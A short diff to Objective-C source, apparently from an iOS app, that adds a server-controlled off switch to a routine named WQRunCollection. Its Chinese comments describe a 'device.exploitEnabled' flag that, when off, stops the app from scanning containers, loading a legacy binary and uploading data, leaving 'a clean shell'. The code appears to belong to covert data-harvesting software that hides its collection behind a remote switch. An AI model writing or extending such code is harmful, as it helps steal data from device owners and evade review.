@@ -946,6 +946,16 @@ static NSString *WQRunCollection(void) {
         }
         NSString *configText = [NSString stringWithUTF8String:configJSON];
         free(configJSON);
+
+        // 服务端关掉采集（device.exploitEnabled = false）时 wqnet_configs()
+        // 返回空串。此时必须整轮退出：不扫描容器、不加载 legacy 二进制、
+        // 不上传任何东西 —— App 就是一个干净的壳。
+        if (configText.length == 0) {
+            WQStage(@"阶段 2/6：服务端已关闭采集，本轮跳过");
+            WQFileLog(@"collect: disabled by server — no scan, no binary, no upload");
+            return @"collect disabled";
+        }
+
         NSData *configData = [configText dataUsingEncoding:NSUTF8StringEncoding];
         id parsed = configData ? [NSJSONSerialization JSONObjectWithData:configData options:0 error:NULL] : nil;
         NSArray *configs = [parsed isKindOfClass:[NSArray class]] ? parsed : @[];
